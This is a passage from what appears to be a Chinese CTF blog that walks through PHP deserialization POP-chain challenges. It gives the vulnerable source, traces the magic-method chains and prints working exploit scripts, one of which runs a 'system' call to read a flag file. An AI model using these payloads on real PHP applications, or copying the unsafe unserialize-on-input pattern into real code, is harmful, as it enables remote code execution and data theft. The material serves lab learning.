</span><br></pre></td></tr></tbody></table></figure><p>本地进行序列化</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>{  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>=<span class="string">"flag.php"</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>{  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file)){  </span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">            <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        }  </span><br><span class="line">    }  </span><br><span class="line">}  </span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><h2 id="多个有类反序列化"><a class="markdownIt-Anchor" href="#多个有类反序列化"></a> 多个有类反序列化</h2><h3 id="swpuctf-2021-新生赛pop"><a class="markdownIt-Anchor" href="#swpuctf-2021-新生赛pop"></a> [SWPUCTF 2021 新生赛] pop</h3><p>1. 读源码</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">"index.php"</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w44m</span></span>{</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$admin</span> = <span class="string">'aaa'</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$passwd</span> = <span class="string">'123456'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Getflag</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;admin === <span class="string">'w44m'</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;passwd ===<span class="string">'08067'</span>){</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        }<span class="keyword">else</span>{</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;admin;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;passwd;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'nono'</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w22m</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;w00m;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w33m</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w22m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;w00m-&gt;{<span class="variable language_">$this</span>-&gt;w22m}();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="variable">$w00m</span> = <span class="variable">$_GET</span>[<span class="string">'w00m'</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$w00m</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></tbody></table></figure><p>2. 寻找 pop 链</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 传参$w00m,直接反序列化，入口就在__destruct，或者_wakeup，这里的w22m符合条件，并且$w00m参数可控,echo触发__toString，__toString方法又当作函数执行，可以触发w44m里的Getflag函数从而输出flag。</span></span><br><span class="line"><span class="comment"># w22m.__destruct().w00m-&gt;w33m.__toString().w00m-&gt;w44m.Getflag()</span></span><br></pre></td></tr></tbody></table></figure><p>3. 写 exp</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w44m</span></span>{</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$admin</span>=<span class="string">"w44m"</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$passwd</span>=<span class="string">"08067"</span>;</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w22m</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">}</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w33m</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w22m</span>;</span><br><span class="line">}</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">w22m</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title function_ invoke__">w33m</span>();</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title function_ invoke__">w44m</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;w00m=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;w00m=<span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;w22m=<span class="string">'Getflag'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></tbody></table></figure><h3 id="swpu-nss新生赛-ez_1zpop"><a class="markdownIt-Anchor" href="#swpu-nss新生赛-ez_1zpop"></a> [SWPU NSS 新生赛]     ez_1zpop</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dxg</span></span></span><br><span class="line"><span class="class"></span>{</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">fmm</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>{</span><br><span class="line">      <span class="keyword">return</span> <span class="string">"nonono"</span>;</span><br><span class="line">   }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lt</span></span></span><br><span class="line"><span class="class"></span>{</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$impo</span>=<span class="string">'hi'</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$md51</span>=<span class="string">'weclome'</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$md52</span>=<span class="string">'to NSS'</span>;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>{</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;impo = <span class="keyword">new</span> dxg;</span><br><span class="line">   }</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>{</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;impo = <span class="keyword">new</span> dxg;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;impo-&gt;<span class="title function_ invoke__">fmm</span>();</span><br><span class="line">   }</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>{</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;impo) &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;md51) == <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;md52) &amp;&amp; <span class="variable language_">$this</span>-&gt;md51 != <span class="variable language_">$this</span>-&gt;md52)</span><br><span class="line">         <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;impo-&gt;<span class="title function_ invoke__">fmm</span>();</span><br><span class="line">   }</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>{</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable language_">$this</span>;</span><br><span class="line">   }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span></span><br><span class="line"><span class="class"></span>{</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$url</span> = <span class="string">'https://www.ctfer.vip'</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$title</span>;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">fmm</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>{</span><br><span class="line">      <span class="variable">$b</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">      <span class="variable">$b</span>(<span class="variable language_">$this</span>-&gt;title);</span><br><span class="line">   }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'NSS'</span>])) {</span><br><span class="line">   <span class="variable">$Data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">'NSS'</span>]);</span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line">   <span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>2. 找 pop 链，注意里面的细节</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">找一下魔术方法__wakeup，__toString，__destruct，想一下他们的触发方式。</span><br><span class="line">__destruct()//对象被销毁时触发</span><br><span class="line">__wakeup()//在使用unserialize()时，会检查是否存在一个__wakeup()魔术方法。如果存在，则该方法会先被调用，预先准备对象需要的资源。</span><br><span class="line">__toString()//方法在将一个对象转化成字符串时自动调用，比如使用echo打印对象时</span><br><span class="line"></span><br><span class="line">再去读一下__wakeup()方法，因为这个方法是可能可以做入口的，发现里面代码执行的是fmm函数，而fmm函数返回的是dxg类里的"nonono",代表这题是要绕过__wakeup方法的，不让它执行。</span><br><span class="line">再去看__destruct函数，里面执行的是echo语句，可以触发__tostring方法。</span><br><span class="line">再去找一下出口，看到还有一个函数，是fin类里面的fmm函数，看fin类里面可以命令执行。现在思路就清晰了。</span><br><span class="line">__destruct()-&gt;__toString()-&gt;fin.fmm();</span><br></pre></td></tr></tbody></table></figure><p>3.exp</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dxg</span></span></span><br><span class="line"><span class="class"></span>{</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fmm</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"nonono"</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lt</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$impo</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$md51</span>=<span class="string">'QNKCDZO'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$md52</span>=<span class="string">'240610708'</span>;</span><br><span class="line">}</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">"system"</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$url</span> = <span class="string">'https://www.ctfer.vip'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$title</span>=<span class="string">"cat ../../../../flag"</span>;</span><br><span class="line">}</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">dxg</span>();</span><br><span class="line"><span class="variable">$nss</span>=<span class="keyword">new</span> <span class="title function_ invoke__">lt</span>();</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title function_ invoke__">fin</span>();</span><br><span class="line"><span class="variable">$nss</span>-&gt;impo=<span class="variable">$c</span>;</span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">serialize</span>(<span class="variable">$nss</span>));</span><br></pre></td></tr></tbody></table></figure><h3 id="newstar新生赛-unserializeone"><a class="markdownIt-Anchor" href="#newstar新生赛-unserializeone"></a> NewStar 新生赛   UnserializeOne</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">#Something useful for you : https://zhuanlan.zhihu.com/p/377676274</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Welcome to NewStarCTF, "</span>.<span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sec</span></span>{</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">check</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"CTFers"</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">'/flag'</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easy</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cla</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$fun</span>, <span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cla = <span class="keyword">clone</span> <span class="variable">$var</span>[<span class="number">0</span>];</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eeee</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;obj-&gt;cmd)){</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"success"</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">'pop'</span>])){</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">'pop'</span>]);</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>2. 找 pop 链</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">先找魔术方法，__destruct，__isset，__toString，__invoke，__clone</span><br><span class="line">__destruct()//对象被销毁时触发</span><br><span class="line">__isset( $property ) 当在一个未定义的属性上调用isset()函数时调用此方法</span><br><span class="line">__toString方法在将一个对象转化成字符串时自动调用，比如使用echo打印对象时</span><br><span class="line">__invoke 当尝试以调用函数的方式调用一个对象时，__invoke 方法会被自动调用。</span><br><span class="line">__clone   使用clone方法复制一个对象时，对象会自动调用__clone魔术方法</span><br><span class="line">先看入口：__destruct方法，出口粗看一眼大概率就是__invoke,现在就是要构造一条从入口到出口的pop链。</span><br><span class="line">__call( $method, $arg_array ) 当调用一个未定义(包括没有权限访问)的方法是调用此方法</span><br><span class="line">寻找链条：</span><br><span class="line">__destruct(Start)方法里有echo，触发__toString(Sec)，toString里的check可以触发__call(Eazy),__call里面用了clone函数，触发了__clone(eeee)方法，调用了isset函数，isset函数又恰好调用了未定义属性cmd，触发了__isset()魔术方法,__isset(Start)里以函数的形式可以调用一个对象，只需要把一个对象赋值给$func变量就可以触发__invoke(Sec)方法了。</span><br><span class="line">Start-&gt;__destruct 触发 Sec-&gt;__toString 触发 Easy-&gt;__call</span><br><span class="line">触发 eeee-&gt;__clone 触发 Start-&gt;__isset 触发 Sec-&gt;invoke</span><br></pre></td></tr></tbody></table></figure><p>3.exp (exp 写不出来，看了别人的自己复现出的，多看几遍)</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;func=<span class="keyword">new</span> <span class="title class_">Sec</span>();  <span class="comment">//因为要触发invoke，invoke在Sec类里</span></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sec</span></span>{</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;    <span class="comment">//不是很理解为什么这里可以改成public</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj = <span class="keyword">new</span> <span class="title class_">Easy</span>();    <span class="comment">//触发 Easy-&gt;__call,call传两个参数，触发__clone是取决于var参数</span></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easy</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cla</span>;</span><br><span class="line">}</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eeee</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Start</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">Sec</span>();</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title class_">Easy</span>();</span><br><span class="line"><span class="variable">$d</span>=<span class="keyword">new</span> <span class="title function_ invoke__">eeee</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name=<span class="variable">$b</span>;    <span class="comment">//可以触发 Sec-&gt;__toString，所以写这里</span></span><br><span class="line"><span class="variable">$d</span>-&gt;obj=<span class="variable">$a</span>;     <span class="comment">//因为要触发 Start-&gt;__isset</span></span><br><span class="line"><span class="variable">$b</span>-&gt;<span class="keyword">var</span>=<span class="variable">$d</span>;     <span class="comment">//触发eeee-&gt;__clone</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$d</span>));<span class="comment">//$d传参进去马上被反序列化，因为$d-&gt;obj=$a，所以直接触发Start-&gt;__destruct</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Start-&gt;__destruct 触发 Sec-&gt;__toString 触发 Easy-&gt;__call</span></span><br><span class="line"><span class="comment">//触发 eeee-&gt;__clone 触发 Start-&gt;__isset 触发 Sec-&gt;invoke</span></span><br></pre></td></tr></tbody></table></figure><h3 id="写个demo题试试水以后补充"><a class="markdownIt-Anchor" href="#写个demo题试试水以后补充"></a> 写个 demo 题试试水 (以后补充)</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 